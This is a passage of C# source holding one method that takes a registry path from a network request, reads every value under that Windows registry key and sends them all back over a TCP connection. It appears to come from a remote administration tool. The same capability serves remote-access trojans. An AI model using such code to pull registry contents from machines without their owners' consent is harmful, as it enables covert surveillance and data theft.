            #region SendRegistryKeyValues method

            public void SendRegistryKeyValues()
            {
                MemoryStream memoryStream_ReceivedData = new MemoryStream(byteArray_ReceivedData, 4, byteArray_ReceivedData.Length - 4);

                string string_RegistryKeyName = CommonMethods.ReadStringFromStream(memoryStream_ReceivedData),
                    string_BaseRegistryKey = String.Empty;

                int int_ItemsCount = CommonMethods.ReadIntFromStream(memoryStream_ReceivedData),
                    int_DataTypeIndex = 0;

                int[] intArray_RegistryKeyPath = new int[int_ItemsCount];

                for (int int_CycleCount = 0; int_CycleCount != int_ItemsCount; int_CycleCount++)
                {
                    intArray_RegistryKeyPath[int_CycleCount] = CommonMethods.ReadIntFromStream(memoryStream_ReceivedData);
                }

                RegistryKey registryKey_obj = null;

                if (string_RegistryKeyName.IndexOf("\\") != -1)
                {
                    string_BaseRegistryKey = string_RegistryKeyName.Substring(0, string_RegistryKeyName.IndexOf("\\"));
                }
                else string_BaseRegistryKey = string_RegistryKeyName;

                switch (string_BaseRegistryKey)
                {
                    case "HKEY_CLASSES_ROOT":
                        registryKey_obj = Registry.ClassesRoot;
                        break;

                    case "HKEY_CURRENT_USER":
                        registryKey_obj = Registry.CurrentUser;
                        break;

                    case "HKEY_LOCAL_MACHINE":
                        registryKey_obj = Registry.LocalMachine;
                        break;

                    case "HKEY_USERS":
                        registryKey_obj = Registry.Users;
                        break;

                    case "HKEY_CURRENT_CONFIG":
                        registryKey_obj = Registry.CurrentConfig;
                        break;
                }

                if (string_RegistryKeyName.IndexOf("\\") != -1)
                {
                    string_RegistryKeyName = string_RegistryKeyName.Remove(0, string_RegistryKeyName.IndexOf("\\") + 1);

                    registryKey_obj = registryKey_obj.OpenSubKey(string_RegistryKeyName);
                }

                MemoryStream memoryStream_DataToSend = new MemoryStream();

                CommonMethods.WriteIntToStream(memoryStream_DataToSend, 33);
                CommonMethods.WriteStringToStream(memoryStream_DataToSend, string_RegistryKeyName);
                CommonMethods.WriteIntToStream(memoryStream_DataToSend, registryKey_obj.ValueCount);

                foreach (string string_CurrentValueName in registryKey_obj.GetValueNames())
                {
                    if (registryKey_obj.GetValue(string_CurrentValueName).GetType() == Type.GetType("System.Int32")) int_DataTypeIndex = 0;
                    if (registryKey_obj.GetValue(string_CurrentValueName).GetType() == Type.GetType("System.String")) int_DataTypeIndex = 1;
                    if (registryKey_obj.GetValue(string_CurrentValueName).GetType() == Type.GetType("System.String[]")) int_DataTypeIndex = 2;
                    if (registryKey_obj.GetValue(string_CurrentValueName).GetType() == Type.GetType("System.Byte[]")) int_DataTypeIndex = 3;

                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, string_CurrentValueName);

                    CommonMethods.WriteIntToStream(memoryStream_DataToSend, int_DataTypeIndex);

                    switch (int_DataTypeIndex)
                    {
                        case 0:
                            {
                                CommonMethods.WriteIntToStream(memoryStream_DataToSend, (int)registryKey_obj.GetValue(string_CurrentValueName));
                            }
                            break;

                        case 1:
                            {
                                CommonMethods.WriteStringToStream(memoryStream_DataToSend, (string)registryKey_obj.GetValue(string_CurrentValueName));
                            }
                            break;

                        case 2:
                            {
                                CommonMethods.WriteIntToStream(memoryStream_DataToSend, ((string[])registryKey_obj.GetValue(string_CurrentValueName)).Length);

                                for (int int_CycleCount = 0; int_CycleCount != ((string[])registryKey_obj.GetValue(string_CurrentValueName)).Length; int_CycleCount++)
                                {
                                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, ((string[])registryKey_obj.GetValue(string_CurrentValueName))[int_CycleCount]);
                                }
                            }
                            break;

                        case 3:
                            {
                                CommonMethods.WriteBytesToStream(memoryStream_DataToSend, (byte[])registryKey_obj.GetValue(string_CurrentValueName));
                            }
                            break;
                    }
                }

                CommonMethods.WriteIntToStream(memoryStream_DataToSend, intArray_RegistryKeyPath.Length);

                for (int int_CycleCount = 0; int_CycleCount != intArray_RegistryKeyPath.Length; int_CycleCount++)
                {
                    CommonMethods.WriteIntToStream(memoryStream_DataToSend, intArray_RegistryKeyPath[int_CycleCount]);
                }

                CurrentlyUsedTcpClient.SendData(memoryStream_DataToSend.ToArray(), SentDataType.ApplicationData);

                registryKey_obj.Close();

                memoryStream_DataToSend.Close();
                memoryStream_ReceivedData.Close();
            }


